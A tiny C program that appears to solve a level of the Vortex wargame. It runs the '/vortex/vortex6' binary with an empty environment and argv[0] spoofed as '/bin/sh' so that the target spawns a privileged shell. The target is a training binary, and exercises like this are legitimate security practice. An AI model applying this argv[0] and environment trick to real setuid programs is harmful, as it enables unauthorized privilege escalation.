#include <unistd.h>

int main(int argc, char** argv)
{
    char* boom[] = {(char*)NULL};
    char* margs[] = {"/bin/sh", (char*)NULL};
    execvpe("/vortex/vortex6", margs, boom);
    exit(0); 
}

